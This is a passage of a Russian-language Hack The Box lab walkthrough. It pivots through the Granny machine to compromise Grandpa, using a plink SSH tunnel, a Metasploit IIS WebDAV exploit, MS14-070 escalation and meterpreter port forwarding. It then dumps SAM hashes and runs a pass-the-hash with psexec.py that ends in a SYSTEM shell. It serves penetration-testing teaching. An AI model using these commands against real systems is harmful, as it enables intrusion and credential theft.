[![etc-passwd-edit.png](/assets/images/htb/machines/grandparents/etc-passwd-edit.png)](/assets/images/htb/machines/grandparents/etc-passwd-edit.png)
{:.center-image}

Теперь все готово и можно прокладывать SSH-туннель. Из командной строки Windows я выполню такую команду.

```
C:\Inetpub\wwwroot>plink.exe -l snovvcrash -pw qwe123 -L 10.10.10.15:8888:10.10.14.30:8888 -N 10.10.14.30
```

[![ssh-tunnel-create.png](/assets/images/htb/machines/grandparents/ssh-tunnel-create.png)](/assets/images/htb/machines/grandparents/ssh-tunnel-create.png)
{:.center-image}

Это означает примерно следующее: «Granny, перенаправляй, пожалуйста, все, что поступит в порт `8888` интерфейса `10.10.10.15` по адресу `10.10.14.30:8888` через SSH-туннель». Проверить работоспособность можно с помощью обычного `nc`.

[![ssh-tunnel-check.png](/assets/images/htb/machines/grandparents/ssh-tunnel-check.png)](/assets/images/htb/machines/grandparents/ssh-tunnel-check.png)
{:.center-image}

Обращаю внимание, чтобы не возникло путаницы: туннель был создан с опцией `-L` с хоста Granny, поэтому по отношению к машине атакующего он является «прямым». Если же посмотреть на эту схему со стороны Kali, то туннель логичнее называть «реверсивным».

Теперь наша схема выглядит так.

[![network-pivot-ssh-tunnel.png](/assets/images/htb/machines/grandparents/network-pivot-ssh-tunnel.png)](/assets/images/htb/machines/grandparents/network-pivot-ssh-tunnel.png)
{:.center-image}

### Hack Grandpa!

Все готово, и можно (во второй раз) скомпрометировать систему Grandpa.

Для этого я опять выберу эксплоит `iis_webdav_scstoragepathfromurl`, но в этот раз его настройка будет немного отличаться: на роль машины атакующего (`LHOST`) я назначу хост Granny (`10.10.10.15`), а в роли порта для привязки хендлера (`LPORT`) выступит порт `8888` (через который все будет отправляться на Kali по SSH-туннелю).

[![msf-pivot-grandpa-scstoragepathfromurl.png](/assets/images/htb/machines/grandparents/msf-pivot-grandpa-scstoragepathfromurl.png)](/assets/images/htb/machines/grandparents/msf-pivot-grandpa-scstoragepathfromurl.png)
{:.center-image}

После проведения эксплуатации я повышу привилегии с помощью не подводившего еще нас MS14-070.

[![msf-pivot-grandpa-privesc.png](/assets/images/htb/machines/grandparents/msf-pivot-grandpa-privesc.png)](/assets/images/htb/machines/grandparents/msf-pivot-grandpa-privesc.png)
{:.center-image}

После всех манипуляций можно открыть сессию meterpreter и посмотреть информацию о системе.

```
meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

Мы захватили полной контроль над Grandpa, не обменявшись с ним напрямую ни одним битом информации. Ура, задача решена!

## Проброс портов до локального сервиса

На сладкое рассмотрим еще один кейс перенаправления трафика.

Файрвол на Grandpa никто не отключал, поэтому мы не можем так просто получить доступ к его SMB-ресурсу извне (в списке открытых портов Nmap не было 445-го, как ты помнишь). Однако вот что мы можем сделать: с помощью meterpreter пробросить свой локальный порт `445` с Kali до машины Grandpa, вытащив таким образом сервис SMB последнего на поверхность.

```
meterpreter > portfwd add -l 445 -p 445 -r 127.0.0.1
[*] Local TCP relay created: :445 <-> 127.0.0.1:445
```

Этой командой я говорю, что локальный порт `445` (флаг `-l`) машины атакующего должен ассоциироваться с открытой сессией meterpreter, а все, что в него попадает, должно быть передано на удаленный порт `445` (флаг `-p`) машины-жертвы (флаг `-r`) по интерфейсу `127.0.0.1` (так как SMB доступен локально на Windows Server). Если повторно запустить Nmap и просканировать 445-й порт (заметь, уже на локалхосте) — о, чудо, он окажется открытым!

[![nmap-grandpa-smb.png](/assets/images/htb/machines/grandparents/nmap-grandpa-smb.png)](/assets/images/htb/machines/grandparents/nmap-grandpa-smb.png)
{:.center-image}

То есть поверх уже настроенного в Metasploit маршрута мы пробросили порт `445` с машины атакующего до порта `445` на ВМ Grandpa, который прежде был доступен только на loopback-интерфейсе из-за правил файрвола. В честь этого завершим обновление нашей схемы взаимодействия, добавив на нее проброс 445-го порта.

[![network-pivot-portfwd.png](/assets/images/htb/machines/grandparents/network-pivot-portfwd.png)](/assets/images/htb/machines/grandparents/network-pivot-portfwd.png)
{:.center-image}

### Pass-the-Hash

Так как это Windows Server 2003, тебе не составит большого труда вскрыть шару SMB, ведь здесь все еще актуальны LM-хеши для хранения паролей. А они ломаются на раз. Однако я пойду по еще более простому пути.

[![msf-pivot-grandpa-hashdump.png](/assets/images/htb/machines/grandparents/msf-pivot-grandpa-hashdump.png)](/assets/images/htb/machines/grandparents/msf-pivot-grandpa-hashdump.png)
{:.center-image}

Благодаря `hashdump` я могу сдампить пару хешей `LMHASH:NTHASH` из базы данных SAM и провести атаку Pass-the-Hash с помощью внешней утилиты `psexec.py`, входящей в состав тулкита [Impacket](https://github.com/SecureAuthCorp/impacket).

```
root@kali:~# ./psexec.py -hashes '0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a21967c3c997548' Administrator@127.0.0.1
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share C$
[*] Uploading file NNDHtRms.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service tWni on 127.0.0.1.....
[*] Starting service tWni.....
[!] Press help for extra shell commands
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
nt authority\system
```

Теперь, действительно, все.

Полезные ссылки:

* [A Pivot Cheatsheet for Pentesters](https://nullsweep.com/pivot-cheatsheet-for-pentesters/)
* [Explore Hidden Networks With Double Pivoting](https://pentest.blog/explore-hidden-networks-with-double-pivoting/)
* [Использование ssh socks прокси совместно с MSF Reverse TCP Payloads](https://habr.com/ru/post/167893/)
